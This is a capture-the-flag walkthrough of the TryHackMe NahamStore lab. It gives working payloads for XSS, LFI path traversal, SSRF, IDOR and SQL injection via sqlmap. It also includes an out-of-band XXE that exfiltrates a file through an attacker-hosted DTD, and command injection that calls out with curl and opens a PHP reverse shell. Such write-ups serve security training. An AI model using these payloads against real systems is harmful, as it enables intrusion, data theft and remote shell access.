### NahamStore


#### Summary


<!-- MarkdownTOC -->

- [Overview](#overview)
- [Key Learnings](#key-learnings)
- [Enumeration](#enumeration)
	- [Subdomains](#subdomains)
	- [NMAP Scan](#nmap-scan)
- [Recon](#recon)
- [Cross-site Scripting](#cross-site-scripting)
- [Open Redirect](#open-redirect)
- [IDOR](#idor)
- [Local File Inclusion](#local-file-inclusion)
- [SSRF](#ssrf)
- [XXE](#xxe)
- [RCE](#rce)
- [SQL Injection](#sql-injection)

<!-- /MarkdownTOC -->



<br><br>


#### Overview

* This is a walk-through of NahamStore TryHackMe room.


<br><br>


#### Key Learnings

* Always try HTTP verb tampering attack, even on requests that are working properly as it may disclose sensitive information or interesting responses.  Verb tampering does not need to be used only to bypass authorization, etc.

* To help identify command injection vulnerability use the "curl" command as the payload to see if network connections are made to your server.

```
$(curl IP)
```

* HTTP verb tampering can be used to change from POST -> GET, and the parameter values may be reflected in the response to introduce XSS, or other vulnerabilities.

* Check the /etc/hosts file if you can access it, this may reveal other subdomains/virtual hosts.

* When in doubt Fuzz for parameters, directories, files, etc.


<br><br>


#### Enumeration

##### Subdomains


* Set the scope in Burp Suite:

* https://ethicalsumit.medium.com/add-all-subdomains-to-scope-burp-suite-8132a357b09c


```
.*\.nahamstore\.thm$
nahamstore.thm
```


* Initial domain:

```
nahamstore.thm
```

* Virus total disclosed a few subdomains:

```
https://www.virustotal.com/gui/domain/nahamstore.com/relations
```

* These sub-domains need to be added to the /etc/hosts file:

* Remember to change the ".com" to ".thm"

```
bvht73kj.nahamstore.com

awzq0w02.nahamstore.com

12345678.nahamstore.com

stock.nahamstore.com

marketing.nahamstore.com

shop.nahamstore.com

www.nahamstore.com 
```

* The following site disclosed a new sub-domain - https://crt.sh/?q=nahamstore.com

```
nahamstore-2020.nahamstore.com
```

* Sublister did not discover any new subdomains:

```
sublist3r -d nahamstore.com
```

* Using some commands from DNSRecon tool did not disclose anything interesting:

* https://securitytrails.com/blog/dnsrecon-tool


<br>


* FFUF:

* REMEMBER to use the ".thm" domain.  If you use the ".com" TLD this will not work as we are trying to find subdomains for the IP address we got from THM.

* The scan did not return anything new

```
ffuf -u "http://10.10.164.42" -H "Host: FUZZ.nahamstore.thm" -w "/usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt" -fw 125
```

<br>


* List of all subdomains we have so far:

```
10.10.164.42	nahamstore.thm bvht73kj.nahamstore.thm awzq0w02.nahamstore.thm 12345678.nahamstore.thm stock.nahamstore.thm marketing.nahamstore.thm shop.nahamstore.thm www.nahamstore.thm nahamstore-2020.nahamstore.thm
```


* The following sub-domains either redirected to http://nahamstore.thm or returned the default message from nahamstore.com:

```
bvht73kj.nahamstore.thm awzq0w02.nahamstore.thm 12345678.nahamstore.thm shop.nahamstore.thm www.nahamstore.thm
```

<br><br><br>


##### NMAP Scan

* The nmap scan disclosed 3 ports open: 22, 80, 8000

```
nmap -sC -sV -O 10.10.164.42
```



<br><br><br>


#### Recon


* Use an RCE vulnerability to disclose another subdomain called - nahamstore-2020-dev.nahamstore.thm

* Look into the /etc/hosts file

```
POST /pdf-generator HTTP/1.1
Host: nahamstore.thm

what=order&id=4$(php+-r+'$sock%3dfsockopen("10.6.44.219",4444)%3bexec("/bin/sh+-i+<%263+>%263+2>%263")%3b')
```


* Then Fuzz for directories.

* Wordlist - /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt

* Fuzzing helped to disclose the /api/customers endpoint, then the application itself disclosed the parameter - customer_id.


```
http://nahamstore-2020-dev.nahamstore.thm/api/customers/?customer_id=2
```


<br><br><br>


#### Cross-site Scripting


* The following parameter vulnerable to XSS:

```
http://nahamstore.thm/search?q=test123%27%3B+alert%281%29%3B%2F%2F
```

* Decoded:

```
http://nahamstore.thm/search?q=test123'; alert(1);//
```

* Sink (affected code where the input was relfect in.):

```
<script>
    var search = 'test123'; alert(1);//'; ...
```

<br>

* The following request's User-Agent header was vulnerable to stored XSS, as the next request would reflect it's value unencoded.

```
POST /basket HTTP/1.1
Host: nahamstore.thm
User-Agent: <script>alert(1)</script>
...
address_id=7&card_no=1234123412341234
```

<br>


* Fuzz for parameters under the following URL:

```
http://marketing.nahamstore.thm/?FUZZ=test
```

* Wordlist - /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt

```
http://marketing.nahamstore.thm/?error=<script>alert(1)</script>
```


<br>

* In order for the XSS payload to work, we need to escape the \<title\> tag:

```
http://nahamstore.thm/product?id=2&name=Sticker Packtest</title><script>alert(1)</script>
```

<br>

* This was originally a POST request, but changing the method to a GET and including the parameters, the "discount" parameter vulnerable to XSS, the angle brackets were being removed, so the autofocus attribute can be used:


```
http://nahamstore.thm/product?id=2&add_to_basket=1&discount=12345%22+autofocus+onfocus=alert(1)+%22
```


<br><br><br>


#### Open Redirect


```
ffuf -u "http://nahamstore.thm/?FUZZ=test" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 4254
```

* After fuzzing for parameters the following was disclosed:

```
http://nahamstore.thm/?r=https://www.google.com
```

* Parameter named redirect_url:

```
POST /account/addressbook?redirect_url=http://10.6.44.219:8000
```


<br><br><br>


#### IDOR


* Changing the "address_id" parameter will return another user's address:

```
POST /basket HTTP/1.1
Host: nahamstore.thm
...

address_id=4
```

<br>

* The original request only contained the "what" and "id" parameters that indicate our order number.  Changing the "id" parameter value and rendering the request in the browser will return an error message "Order does not belong to this user_id".

* Simply including the "user_id" field was not working the "&" character needed to be URL encoded, and then render the request/response in the browser.

```
POST /pdf-generator HTTP/1.1
Host: nahamstore.thm
...

what=order&id=3%26user_id=3
```

<br><br><br>

#### Local File Inclusion

```
ffuf -u "http://nahamstore.thm/product/picture/?file=FUZZ" -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 19
```

```
http://nahamstore.thm/product/picture/?file=....//....//....//....//....//....//lfi/flag.txt
```


<br><br><br>

#### SSRF

* SSRF vulnerability was identified in the following request:


```
POST /stockcheck HTTP/1.1
Host: nahamstore.thm
...
product_id=2&server=stock.nahamstore.thm@10.6.44.219:8000#
```


* After confirming the vulnerability we'll have to fuzz for internal APIs:


* Wordlist - /usr/share/wordlists/SecLists/Discovery/DNS/dns-Jhaddix.txt


```
POST /stockcheck HTTP/1.1
Host: nahamstore.thm

product_id=2&server=stock.nahamstore.thm@§§.nahamstore.thm#
```

* After finding the internal site, the responses disclose the endpoints:


```
POST /stockcheck HTTP/1.1
Host: nahamstore.thm

product_id=2&server=stock.nahamstore.thm@internal-api.nahamstore.thm/orders/5ae19241b4b55a360e677fdd9084c21c#
```


<br><br><br>


#### XXE

* There was a GET request like the following:

```
http://stock.nahamstore.thm/product/2
```

* Change the request to a POST, and the application reveals an error message "["Missing header X-Token"]".

* Fuzz for parameters/directories:

```
ffuf -u "http://stock.nahamstore.thm/product/2?FUZZ" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 42
```

* XXE payload:

```
POST /product/2?xml
```

```
<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]><root>
<X-Token>test123&xxe;</X-Token>
</root>
```


<br>


* This endpoint has a functionality vulnerable to XXE:

* http://nahamstore.thm/staff

* Use a .xlsx file and move it into an isolated folder

* Then use the following commands:

```
unzip file.xlsx
```

* Open the "workbook.xml" file and include the following code in the file: (Change IP)

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM "http://10.6.44.219/malicious.dtd">%asd;%c;]>
<cdl>&rrr;</cdl>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
``` 


* Add the following XML code in a malicious.dtd file on your server: (Change IP)

```
<!ENTITY % d SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'http://10.6.44.219/%d;'>"> 
```

* Finally save all the file and run the following:

```
zip -r NahamStore\ -\ TryHackMe.xlsx *
```

* Start a listener, then upload the .xlsx file to the application:

```
 php -S 0.0.0.0:80
 ```


<br><br><br>


#### RCE


```
ffuf -u "http://nahamstore.thm:8000/FUZZ" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
```

* Default credentials worked - admin/admin

```
http://nahamstore.thm:8000/admin
```

* Here were are able to edit a market campaign details, there is an input box called "code" with some HTML content, add PHP code and see if it gets executed: (Use a web shell)

```
<?php echo "hi"; ?>
```


* Browse to the following sub-domain and view the updated campaign, and the code was excuted:

```
http://marketing.nahamstore.thm/
```



<br>

* The following request was vulnerable to RCE:

```
POST /pdf-generator HTTP/1.1
Host: nahamstore.thm
```

* Payload used to identify the vulnerability:

```
what=order&id=4$(curl+10.6.44.219)
```

* Reverse shell:

```
what=order&id=4$(php+-r+'$sock%3dfsockopen("10.6.44.219",4444)%3bexec("/bin/sh+-i+<%263+>%263+2>%263")%3b')
```

* Decoded:

```
what=order&id=4$(php -r '$sock=fsockopen("10.6.44.219",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```


<br><br><br>


#### SQL Injection


* SQL Injection was found under this endpoint:

* Use SQLmap to dump the tables:

```
sqlmap -u "http://nahamstore.thm/product?id=2" --batch --dump
```

<br>

* Blind SQL Injection was found here:

```
POST /returns HTTP/1.1
Host: nahamstore.thm

-----------------------------314950343633128084192905981754
Content-Disposition: form-data; name="order_number"

1; select sleep (10)--
-----------------------------314950343633128084192905981754
```

* Another payloads that worked to identify the vulnerability was:

* The response retuned between these payloads was very different:

```
1 or 1=test--
```

```
1 or 1=1--
```

* Save the entire POST request to a .txt file so we can send it to SQLMap:

* Include a \* within the value of the vulnerable parameter:

```
POST /returns HTTP/1.1
Host: nahamstore.thm
...

-----------------------------314950343633128084192905981754
Content-Disposition: form-data; name="order_number"

1*
-----------------------------314950343633128084192905981754
```

